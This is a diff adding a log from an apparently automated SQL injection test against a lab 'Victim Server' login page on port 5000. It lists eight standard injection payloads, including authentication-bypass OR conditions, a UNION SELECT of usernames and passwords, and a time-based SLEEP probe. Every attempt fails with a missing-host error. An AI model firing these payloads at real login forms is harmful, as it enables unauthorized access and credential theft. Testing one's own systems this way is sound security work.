@@ -1,0 +1,51 @@
+============================================================
+Attack Type: SQL_Injection
+Timestamp: 2025-10-29_20-23-56
+Target: :5000
+============================================================
+
+[20:23:48] 🔴 ATTACK INITIATED: SQL Injection
+[20:23:48] Target: Victim Server (:5000/login)
+[20:23:48] Testing various SQL injection techniques...
+[20:23:48] 
+[Test 1/8] Authentication Bypass (OR condition)
+[20:23:48]    Payload: ' OR '1'='1
+[20:23:48]    ❌ Error: Invalid URL 'http://:5000/login': No host supplied
+[20:23:49] 
+[Test 2/8] Comment Injection
+[20:23:49]    Payload: admin'--
+[20:23:49]    ❌ Error: Invalid URL 'http://:5000/login': No host supplied
+[20:23:50] 
+[Test 3/8] UNION-based Injection
+[20:23:50]    Payload: ' UNION SELECT NULL, username, password FROM users--
+[20:23:50]    ❌ Error: Invalid URL 'http://:5000/login': No host supplied
+[20:23:51] 
+[Test 4/8] Boolean-based Injection
+[20:23:51]    Payload: ' OR 1=1--
+[20:23:51]    ❌ Error: Invalid URL 'http://:5000/login': No host supplied
+[20:23:52] 
+[Test 5/8] Time-based Blind Injection
+[20:23:52]    Payload: admin' AND SLEEP(5)--
+[20:23:52]    ❌ Error: Invalid URL 'http://:5000/login': No host supplied
+[20:23:53] 
+[Test 6/8] Alternative OR condition
+[20:23:53]    Payload: ' OR 'a'='a
+[20:23:53]    ❌ Error: Invalid URL 'http://:5000/login': No host supplied
+[20:23:54] 
+[Test 7/8] Nested condition bypass
+[20:23:54]    Payload: 1' OR '1' = '1')) --
+[20:23:54]    ❌ Error: Invalid URL 'http://:5000/login': No host supplied
+[20:23:55] 
+[Test 8/8] Block comment injection
+[20:23:55]    Payload: admin' /*
+[20:23:55]    ❌ Error: Invalid URL 'http://:5000/login': No host supplied
+[20:23:56] 
+==================================================
+[20:23:56] 📊 ATTACK SUMMARY
+[20:23:56] ==================================================
+[20:23:56] Total Payloads Tested: 8
+[20:23:56] Exploitable Vulnerabilities: 0
+[20:23:56] Blocked by Firewall: 0
+[20:23:56] Protected/Failed: 8
+[20:23:56] 
+⏱️  Attack Duration: 8.02 seconds
